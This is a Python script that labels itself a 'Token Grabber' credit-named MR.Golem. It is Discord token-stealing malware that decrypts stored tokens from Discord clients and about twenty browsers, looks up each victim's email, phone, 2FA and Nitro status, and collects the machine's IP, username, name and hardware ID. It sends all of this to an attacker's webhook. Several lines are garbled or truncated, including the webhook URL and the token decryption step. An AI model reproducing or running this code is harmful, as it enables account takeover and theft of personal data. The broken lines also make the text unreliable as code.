from base64 import b64decode
from Crypto.Cipher import AES
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
import win32crypt
from sys import platform as _platform

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception:
        return None

def gethwid():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        output = (p.stdout.read() + p.stderr.read()).decode().split("\n")
        for line in output:
            if line.strip() and "UUID" not in line:
                return line.strip()
        return "Unknown"
    except Exception:
        return "Unknown"

def get_ip():
    try:
        return urlopen(Request("https://api.ipify.org"), timeout=5).read().decode().strip()
    except Exception:
        return "None"

def get_token():
    already_check = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    WEBHOOK_URL = "

    for platform_name, path in paths.items():
        if not os.path.exists(path):
            continue

        key = None
        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except Exception:
            continue

        try:
            master_key = win32crypt.CryptUnprotectData(b64decode(key)[5:], None, None, None, 0)[1]
        except Exception:
            continue

        leveldb_path = path + "\\Local Storage\\leveldb"
        if not os.path.exists(leveldb_path):
            continue

        for file in listdir(leveldb_path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(leveldb_path + "\\" + file, "r", errors='ignore') as files:
                    for x in files.readlines():
                        for values in findall(r"dQw4w9WgXcQ:[^\"]+", x):
                            tokens.append(values)
            except Exception:
                continue

        for i in tokens:
            if i.endswith("\\"):
                i = i.replace("\\", "")
            if i not in cleaned:
                cleaned.append(i)

        for token in cleaned:
            try:
                token_part = 
                 = , master_key)
                if decrypted_token is None:
                    continue
            except Exception:
                continue

            if decrypted_token in already_check:
                continue

            already_check.append(decrypted_token)
            headers = {'Authorization': decrypted_token, 'Content-Type': 'application/json'}

            try:
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
                if res.status_code != 200:
                    continue

                user_data = res.json()

                has_nitro = False
                days_left = 0
                try:
                    res_nitro = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                             headers=headers, timeout=10)
                    nitro_data = res_nitro.json()
                    has_nitro = bool(len(nitro_data) > 0)
                    if has_nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                except Exception:
                    pass

                user_id = user_data.get('id', 'Unknown')
                email = user_data.get('email', 'Unknown')
                phone = user_data.get('phone', 'None')
                mfa_enabled = user_data.get('mfa_enabled', False)
                username = user_data.get('username', 'Unknown') + '#' + user_data.get('discriminator', '0000')

                ip = get_ip()
                pc_username = getlogin()
                pc_name = os.getenv("COMPUTERNAME", "Unknown")
                hwid = gethwid()

                embed = f"""**{username}** *({user_id})*

> :dividers: __Account Information__
\tEmail: `{email}`
\tPhone: `{phone}`
\t2FA/MFA Enabled: `{mfa_enabled}`
\tNitro: `{has_nitro}`
\tExpires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
\tIP: `{ip}`
\tUsername: `{pc_username}`
\tPC Name: `{pc_name}`
\tHWID: `{hwid}`
\tPlatform: `{platform_name}`

> :piñata: __Token__
\t`{decrypted_token}`

*MR.Golem

                payload = json.dumps({
                    'content': embed,
                    'username': 'Token Grabber - MR.Golem
                    'avatar_url': 'https://i.imgur.com/4M34hi2.png'
                })

                headers2 = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }

                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers2)
                urlopen(req)

            except Exception:
                continue

if __name__ == '__main__':
    get_token()